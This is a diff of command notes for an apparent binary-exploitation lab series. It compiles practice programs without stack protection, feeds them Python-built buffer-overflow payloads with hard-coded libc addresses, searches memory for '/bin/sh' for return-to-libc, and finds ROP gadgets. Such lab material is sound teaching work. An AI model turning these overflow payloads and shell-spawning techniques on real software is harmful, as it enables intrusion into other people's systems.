@@ -1,11 +1,12 @@
-g++ -m32 -fno-stack-protector -g 01-calling-arguments.cpp -o 01-calling-arguments
+gcc -m32 -fno-stack-protector -g 01-calling-arguments.c -o 01-calling-arguments
 
 gdb -q ./01-calling-arguments -ex "set disassembly intel" -ex "set confirm off"
 
-r $(python -c 'print "a" * 128 + "c" * 12 + "\x90\x21\xe4\xf7" + "dddd" + "\x50\x85\x04\x08"')
+cat <(python -c 'print "a" * 128 + "c" * 12 + "\x90\x41\xe4\xf7" + "dddd" + "\xf0\x84\x04\x08"') - | ./01-calling-arguments
 
 
 
+gcc -m32 -fno-stack-protector -g 02-return-to-libc.c -o 02-return-to-libc
 
 find 0xf7e42190, +99999999999999, "/bin/sh"
 
@@ -13,18 +14,18 @@ find 0xf7e42190, +99999999999999, "/bin/sh"
 
 
 
-g++ -fno-stack-protector -g 03-x86-64.cpp -o 03-x86-64
+gcc -fno-stack-protector -g 03-x86-64.c -o 03-x86-64
 
 gdb -q 03-x86-64 -ex "set disassembly intel"
 
 
 
-g++ -fno-stack-protector -g 04-gadgets.cpp -o 04-gadgets
+gcc -fno-stack-protector -g 04-gadgets.c -o 04-gadgets
 
 ROPgadget --binary 04-gadgets | grep "pop rdi"
 
 
 
-g++ -fno-stack-protector -g 05-memory-write.cpp -o 05-memory-write
+gcc -fno-stack-protector -g 05-memory-write.c -o 05-memory-write
 
 info proc mappings
